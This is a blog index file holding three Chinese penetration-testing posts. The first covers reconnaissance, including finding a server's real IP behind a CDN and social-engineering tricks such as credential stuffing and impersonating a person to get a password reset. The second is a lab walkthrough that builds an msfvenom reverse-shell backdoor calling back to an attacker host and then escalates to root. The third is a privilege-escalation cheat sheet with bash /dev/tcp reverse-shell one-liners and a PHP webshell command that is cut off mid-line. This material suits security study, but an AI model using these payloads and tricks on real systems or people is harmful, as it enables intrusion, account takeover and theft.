<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="/2022/11/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/11/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>渗透测试第一步就是信息收集。渗透测试前，首先要了解目标系统的信息，也就是信息探测。</p><span id="more"></span><p>渗透测试是一项在计算机系统上进行的授权模拟攻击，旨在对其安全性进行评估。渗透测试人员使用与攻击者相同的工具、技术和流程，来查找和展示系统弱点对业务带来的影响。</p><p>渗透测试通常会模拟各种可能威胁您业务的攻击。渗透测试可以检查系统是否足够稳定，能否抵抗来自经过认证和未经认证的攻击，以及一系列系统角色发起的攻击。在合适的范围内，针对您需要评估的系统的任何方面，渗透测试都可以深入其中。</p><p><strong>渗透测试类型</strong><br>根据渗透测试的具体目标，组织针对目标系统向测试者提供不同级别的信息或访问权限。有时，渗透测试团队会在开始时设置一种方法并一直坚持下去。有时，测试团队会随着在渗透测试期间对系统认识的加深而改进其策略。在本行业中，我们讨论了三种类型的渗透测试：</p><ul><li>黑盒。团队对目标系统的内部结构一无所知。他们充当黑客，探寻任何可从外部发起攻击的弱点。</li><li>灰盒。 团队对一套或多套凭证有一定了解。他们还了解目标的内部数据结构、代码和算法。渗透测试人员可以根据详细的设计文档（如目标系统的架构图），构建测试用例。</li><li>白盒。 对于白盒测试，渗透测试人员可以访问系统和系统工件：源代码、二进制文件、容器，有时甚至是运行系统的服务器。白盒方法可在最短的时间内提供最高水平的安全保证。</li></ul><h3 id="0x01-Whois查询"><a href="#0x01-Whois查询" class="headerlink" title="0x01_Whois查询"></a>0x01_Whois查询</h3><p>Whois 是一个标准的互联网协议，可用于收集网络注册信息，注册的域名、IP地 址等信息。简单来说，Whois就是一个用于查询域名是否己被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商)。</p><p><a href="https://www.aizhan.com/">爱站工具网</a></p><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20221103184900117.png" alt=" "></p><h3 id="0x02-备案信息查询"><a href="#0x02-备案信息查询" class="headerlink" title="0x02 备案信息查询"></a>0x02 备案信息查询</h3><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p><p>常用的网站有以下这两个:</p><ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></li><li>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></li></ul><h3 id="0x03-收集敏感信息"><a href="#0x03-收集敏感信息" class="headerlink" title="0x03 收集敏感信息"></a>0x03 收集敏感信息</h3><p>Google是世界上最强的搜索引擎之一，对一位渗透测试者而言，它可能是一款绝佳的黑客工具。我们可以通过构造特殊的关键字语法来搜索互联网上的相关敏感信息。下面列举了一些Google的常用语法及其说明，如下表所示:</p><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td></tr><tr><td>inurl</td><td>URL中存在关键字的网页</td></tr><tr><td>intext</td><td>网页正文中的关键字</td></tr><tr><td>filetype</td><td>指定文件类型</td></tr><tr><td>intitle</td><td>网页标题中的关键字</td></tr><tr><td>link</td><td>link:xx.com 表示返回所有和xx.com 做了连接的URL</td></tr><tr><td>info</td><td>查找指定站点的一些基本信息</td></tr><tr><td>cache</td><td>搜索Google里关于某些内容的缓存</td></tr></tbody></table><p>举个例子，搜索包含有特定字符的URL。例如输入“inurl:&#x2F;admin_login”，则可以找到带有admin_login字符的URL，通常这类网址是管理员后台的登录网址。</p><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20221103191429573.png" alt=" "></p><p>可以看到利用Google搜索，我们可以很轻松地得到想要的信息，还可以用它来收集数据库文件、SOL注入、配置信息、源代码泄露、未授权访问和robots.txt等敏感信息。</p><h3 id="0x04-收集子域名信息"><a href="#0x04-收集子域名信息" class="headerlink" title="0x04 收集子域名信息"></a>0x04 收集子域名信息</h3><p>子域名，凡顶级域名前加前缀的都是该顶级域名的子域名，子域名根据技术的多少分为子域名。</p><p>子域名是某个主域的二级域名或多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">subDomainsBrute <span class="hljs-number">1.4</span> :  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lijiejie/</span>subDomainsBrute<br>Layer子域名挖掘机 : https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/euphrat1ca/</span>LayerDomainFinder<br>OneForAll : https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll<br><br><br>在线子域名查询工具:<br>http:<span class="hljs-regexp">//</span>tool.chinaz.com/subdomain<br>https:<span class="hljs-regexp">//</span>dnsdumpster.com/<br>https:<span class="hljs-regexp">//</span>pentest-tools.com/pricing<br>https:<span class="hljs-regexp">//</span>rapiddns.io/<br>https:<span class="hljs-regexp">//</span>phpinfo.me/domain<br>https:<span class="hljs-regexp">//</span>www.tianyancha.com/<br>http:<span class="hljs-regexp">//</span>www.beianbeian.com/<br></code></pre></td></tr></table></figure><h3 id="0x05-收集常用端口信息"><a href="#0x05-收集常用端口信息" class="headerlink" title="0x05 收集常用端口信息"></a>0x05 收集常用端口信息</h3><p>在渗透测试的过程中，对端口信息的收集是一个很重要的过程，通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，就可以对症下药，便于我们渗透目标服务器。</p><p>所以在端口渗透信息的收集过程中，我们需要关注常见应用的默认端口和在端 口上运行的服务。最常见的扫描工具就是Nmap（具体的使用方法后续章节会详细介绍），无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具。</p><p>文件共享服务器端口:</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>Ftp&#x2F;Tftp 文件传输协议</td><td>允许匿名上传、下载、爆破和嗅探操作</td></tr><tr><td>2049</td><td>Nfs 服务</td><td>配置不当</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><p>远程连接服务端口</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>22</td><td>SSH 远程连接</td><td>爆破、SSH 隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Telnet 远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td>3389</td><td>RDP远程桌面连接</td><td>Shift 后门（需要 Windows Server 2003 以下的系统）、爆破</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>5632</td><td>PyAnywhere服务</td><td>抓密码、代码执行</td></tr></tbody></table><p>数据库服务端口</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td></td><td>MSSQL</td><td>注入、提权、爆破</td></tr><tr><td></td><td>MSSQL 数据库</td><td>注入、提权、 SA 弱口令、爆破</td></tr><tr><td></td><td>Oracle 数据库</td><td>TNS 爆破、注入、反弹 Shell</td></tr><tr><td></td><td>PostgreSQL 数据库</td><td>爆破、注入、弱口令</td></tr><tr><td></td><td>MongoDB</td><td>爆破、 未授权访问</td></tr><tr><td></td><td>Redis 数据库</td><td>可尝试未授权访问、弱口令爆破</td></tr><tr><td></td><td>SysBase&#x2F;DB2 数据库</td><td>爆破、注入</td></tr></tbody></table><p>网络常见协议端口:</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS 劫持、缓存投毒、欺骗</td></tr><tr><td>67&#x2F;68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h3 id="0x06-指纹识别"><a href="#0x06-指纹识别" class="headerlink" title="0x06 指纹识别"></a>0x06 指纹识别</h3><p>指纹由于其终身不变性、唯一性和方便性，几乎己成为生物特征识别的代名词。 通常我们说的指纹就是人的手指末端正面皮肤上凸四不平的纹线，纹线规律地排列形成不同的纹型。而本节所讲的指纹是指网站CMS指纹识别、计算机操作系统及 Web 容器的指纹识别等。</p><p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如 WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator&#x3D;wordpress 3.xx，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识 别出该CMS，所以叫作指纹识别。</p><p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的web容器或者CMS,才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p><p>CMS (Content Management System）又称整站系统或文章系统。在2004年以前。 如果想进行网站内容管理，基本上都靠手工维护，但在信息爆炸的时代，完全靠手工完成会相当痛苦。所以就出现了CMS，开发者只要给客户一个软件包，客户自己安装配置好，就可以定期更新数据来维护网站，节省了大量的人力和物力。 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、 Dvbbs、Site Weaver、AsPCMS、帝国、Z-Blog、WordPress等<br>代表工具有御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识等，可以快速识别一些主流的CMS。</p><p>除了这些工具，读者还可以利用一些在线网站查询CMS指纹识别，如下所示。</p><ul><li>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li><li>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li><li>WhatWeb: <a href="https://whatweb.net/">https://whatweb.net</a></li></ul><h3 id="0x07-查找真实IP"><a href="#0x07-查找真实IP" class="headerlink" title="0x07 查找真实IP"></a>0x07 查找真实IP</h3><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来 确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN， 可以直接通过 <a href="http://www.ip138.com/">http://www.ip138.com</a> 获取目标的一些IP及域名信息。这里主要讲解在以下这几种情况下，如何绕过CDN寻找目标服务器的真实IP</p><ul><li><h3 id="1-目标服务器存在-CDN"><a href="#1-目标服务器存在-CDN" class="headerlink" title="1. 目标服务器存在 CDN"></a>1. 目标服务器存在 CDN</h3></li></ul><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度 性能低下的问题。说得简单点，就是一组在不同运营商之间的对接节点上的高速缓 存服务器，把用户经常访问的静态数据资源（例如静态的html、css、js图片等文件） 直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服 务器上响应给用户，<strong>当用户有实际数据交互时才会从远程Web服务器上响应</strong> ，这样可 以大大提高网站的响应速度及用户体验。</p><p>所以如果渗透目标购买了CDN服务，可以直按ping目标的域名，但得到的并非真正的目标web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我 们没法直接得到目标的真实IP端范围。</p><ul><li><h3 id="2-判断目标是否使用了-CDN"><a href="#2-判断目标是否使用了-CDN" class="headerlink" title="2.判断目标是否使用了 CDN"></a>2.判断目标是否使用了 CDN</h3></li></ul><p>通常会通过ping目标主机，观察域名的解析情况，以此来判断其是否使用了 CDN. 如图:</p><p><img src="/../images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20221103192509362.png" alt=" "></p><p>可以看出如果使用CDN，ping的域名会出现不一致，那就是CDN的域名。</p><p>还可以利用在线网站17CE(<a href="https://www.17ce.㯘/">https://www.17ce.com）进行全国多地区的ping服务</a>ping-cg6m84h71bfww7sal8svw2dyyzc2f9cep2a&#x2F;) 器操作，然后对比每个地区ping的IP结果，查看这些1P是否一致，如果都是一样的， 极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p><ul><li><h3 id="3-绕过-CDN-寻找真实-IP"><a href="#3-绕过-CDN-寻找真实-IP" class="headerlink" title="3. 绕过 CDN 寻找真实 IP"></a>3. 绕过 CDN 寻找真实 IP</h3></li></ul><p>在确认了目标确使用了CDN以后，就需要绕过CDN寻找目标的真实IP，下面介绍一些常规的方法。</p><ul><li><p>内部邮箱源。 一般的邮件系统都在内部，没有经过CDN的解析，通过目标 网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域 名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(注意，必须 是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）</p></li><li><p>扫描网站测试文件，如phpinfo、test等，从而找到目标的真实IP。</p></li><li><p>分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真 实IP段</p></li><li><p>国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不 一定了。因此，通过国外在线代理网站App Synthetic Monitor ( https:&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php ）访问，可能会得到真实的IP。 使用我们全球范国内超过 90 个监拉工作站所组成的网络来 Ping 服务器成网站</p></li><li><h3 id="4-验证获取的IP"><a href="#4-验证获取的IP" class="headerlink" title="4. 验证获取的IP"></a>4. 验证获取的IP</h3></li></ul><p>找到目标的真实IP以后，如何验证其真实性呢？如果是web，最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样；或者在目标段 比较大的情况下，借助类似Masscan的工具批扫描对应卫段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，观察响应结果是否为目标站点。</p><h3 id="0x08-收集敏感目录文件"><a href="#0x08-收集敏感目录文件" class="headerlink" title="0x08 收集敏感目录文件"></a>0x08 收集敏感目录文件</h3><p>在渗透测试中，探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理页面、文件上传界面，甚至可能扫描出网站的源代码。 针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py(轻量级快速单文件日录后台扫描）、Sensitivefilescan（轻量级快速单文件目录后台扫描）、Weakfilescan（轻量级快速单文件目录后台扫描）等工具。</p><h3 id="0x09-社会工程学"><a href="#0x09-社会工程学" class="headerlink" title="0x09 社会工程学"></a>0x09 社会工程学</h3><p>假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送的邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通讨分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p><p>通过进一步地应用社会工程学，假设现在己经收集了目标人物的邮箱、QQ、申话号码、姓名，以及域名服务商，也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p><p>除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到已经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过 利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库。</p>]]></content>
    
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSF-Msfvenonm生成Linux后门木马实验</title>
    <link href="/2022/11/03/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/"/>
    <url>/2022/11/03/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="MSF-Msfvenonm生成Linux后门木马-并进行提权。"><a href="#MSF-Msfvenonm生成Linux后门木马-并进行提权。" class="headerlink" title="MSF-Msfvenonm生成Linux后门木马,并进行提权。"></a>MSF-Msfvenonm生成Linux后门木马,并进行提权。</h2><span id="more"></span><h2 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h2><p>MSF工具的利用,msf生成Linux木马后门</p><h2 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h2><p>攻击机: 192.168.250.172</p><p>靶机: 192.168.250.112</p><h2 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03 实验过程"></a>0x03 实验过程</h2><p>1、生成Linux后门</p><p>打开终端输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.250.172 <span class="hljs-attribute">LPORT</span>=7777 -f elf &gt; lolo.elf<br></code></pre></td></tr></table></figure><p>生成一个lolo.elf的msf后门</p><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps1.jpg" alt=" "> </p><p>2、配置\监听\执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<span class="hljs-comment">#使用监听模块</span><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="hljs-comment">#使用和木马相同的payload</span><br><span class="hljs-built_in">set</span> lhost 192.168.233.161<span class="hljs-comment">#Kali的IP地址</span><br><span class="hljs-built_in">set</span> lport 7777<span class="hljs-comment">#木马设置的端口</span><br>run<span class="hljs-comment">#执行</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps2.jpg" alt=" "> </p><p>3、目标机器上传执行木马后门文件lolo.elf，为木马文件赋予读写执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 lolo.elf<span class="hljs-comment">#文件赋予执行权限</span><br>./lolo.elf<span class="hljs-comment">#执行后门文件</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps3.jpg" alt=" "> </p><p>5.目标机器接收msf会话</p><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps4.jpg" alt=" "> </p><h2 id="0x04后渗透"><a href="#0x04后渗透" class="headerlink" title="0x04后渗透"></a>0x04后渗透</h2><p>后渗透阶段可以执行命令获取内网信息</p><p>1、调用后台</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps5.jpg" alt=" "> </p><p>2、查看文件内容</p><p>提权以及查看文件内容过程:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/multi/recon/local_exploit_suggester    <span class="hljs-comment">#msf本地提权(也可以使用shell执行命令)</span><br>shell<br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span><span class="hljs-comment">#将cve-2021-4043文件加内容上传到test文件夹</span><br><span class="hljs-built_in">ls</span><br>make<br>./cve-2021-4043<br><span class="hljs-built_in">whoami</span><span class="hljs-comment">#是root</span><br><span class="hljs-built_in">cd</span> root<br><span class="hljs-built_in">cat</span> flag<span class="hljs-comment">#查看文件内容</span><br></code></pre></td></tr></table></figure><p><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps6.jpg" alt=" "><img src="/../images/MSF-Msfvenonm%E7%94%9F%E6%88%90Linux%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC%E5%AE%9E%E9%AA%8C/wps7.jpg" alt=" "></p><p>以上就是本次msf生成Linux后门木马实验。</p><p>该文章内容仅用于学习使用Kali Linux系统，请勿用于其他非法途径。</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权</title>
    <link href="/2022/11/03/Linux%E6%8F%90%E6%9D%83/"/>
    <url>/2022/11/03/Linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>本篇文章主要介绍Linux提权 。</p><span id="more"></span><h5 id="常用的系统命令"><a href="#常用的系统命令" class="headerlink" title="常用的系统命令 :"></a>常用的系统命令 :</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#查看内核/操作系统/cpu信息</span><br>hend -n 1 /etc/issue <span class="hljs-comment">#查看操作系统版本</span><br><span class="hljs-built_in">cat</span> /proc/version <span class="hljs-comment">#查看系统信息</span><br>hostname <span class="hljs-comment">#查看计算机名</span><br><span class="hljs-built_in">env</span> <span class="hljs-comment">#查看环境变量</span><br>ifconfig <span class="hljs-comment">#查看网卡</span><br>netstat -lntp <span class="hljs-comment"># 查看所有监听端口</span><br>netstat -antp    <span class="hljs-comment"># 查看所有已经建立的连接</span><br>netstat -s <span class="hljs-comment"># 查看网络统计信息</span><br>iptables -L <span class="hljs-comment">#查看防火墙设置</span><br>route -n <span class="hljs-comment">#查看路由表</span><br>ps -ef <span class="hljs-comment"># 查看所有进程</span><br>top <span class="hljs-comment"># 实时显示进程状态</span><br>w <span class="hljs-comment"># 查看活动用户</span><br><span class="hljs-built_in">id</span> <span class="hljs-comment"># 查看指定用户信息</span><br>last <span class="hljs-comment"># 查看用户登录日志</span><br><span class="hljs-built_in">cut</span> -d: -f1 /etc/passwd <span class="hljs-comment"># 查看系统所有用户</span><br><span class="hljs-built_in">cut</span> -d: -f1 /etc/group  <span class="hljs-comment"># 查看系统所有组</span><br>crontab -l <span class="hljs-comment"># 查看当前用户的计划任务</span><br>chkconfig –list <span class="hljs-comment"># 列出所有系统服务</span><br>chkconfig –list | grep on <span class="hljs-comment"># 列出所有启动的系统服务</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <span class="hljs-comment">#查看系统路径</span><br></code></pre></td></tr></table></figure><h5 id="反弹shell命令"><a href="#反弹shell命令" class="headerlink" title="反弹shell命令 :"></a>反弹shell命令 :</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/ip_address/</span>port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.189/6666 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><h5 id="python调用本地shell实现交互式命令行"><a href="#python调用本地shell实现交互式命令行" class="headerlink" title="python调用本地shell实现交互式命令行:"></a>python调用本地shell实现交互式命令行:</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">终端有些时候系统的命令终端不允许直接访问，可以使用<span class="hljs-keyword">python</span>虚拟化一个终端来执行<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="Linux解决反弹shell乱码问题"><a href="#Linux解决反弹shell乱码问题" class="headerlink" title="Linux解决反弹shell乱码问题"></a>Linux解决反弹shell乱码问题</h5><p>ctrl+z 放置后台任务 设置原始格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stty</span> -<span class="hljs-built_in">echo</span> raw<br></code></pre></td></tr></table></figure><p>fg 调用后台shell</p><h5 id="Linux内核提权"><a href="#Linux内核提权" class="headerlink" title="Linux内核提权 :"></a>Linux内核提权 :</h5><p>​<strong>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache 就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。</strong></p><p>​<strong>利用堆栈溢出漏洞，根据当前系统 寻找对应的漏洞的exp 使用exp对其进行提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">cat</span> /proc/version<br><span class="hljs-built_in">cat</span> /etc/issue<br><span class="hljs-built_in">cat</span> /etc/redhat-release<br>lsb_release -a<br></code></pre></td></tr></table></figure><p><strong>使用MSF自带的exploit漏洞库进行搜索</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -t Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span>   <br><span class="hljs-attribute">searchsploit</span> -s Ubuntu <span class="hljs-number">16</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">searchsploit</span> -s Linux Kernel <span class="hljs-number">3</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><strong>查看漏洞详情</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">searchsploit -x   linux<span class="hljs-regexp">/local/</span><span class="hljs-number">37088</span>.c<br></code></pre></td></tr></table></figure><p><strong>下载漏洞包到本地路径下面</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -m  漏洞包名称<br><span class="hljs-attribute">searchsploit</span> -m  <span class="hljs-number">44329</span>.c<br></code></pre></td></tr></table></figure><h5 id="metasploit-linux-提权"><a href="#metasploit-linux-提权" class="headerlink" title="metasploit linux 提权:"></a>metasploit linux 提权:</h5><p><strong>先生成一个PHP的反向webshell</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=xxx <span class="hljs-attribute">LPORT</span>=xxx -f<span class="hljs-built_in"> raw </span>&gt; 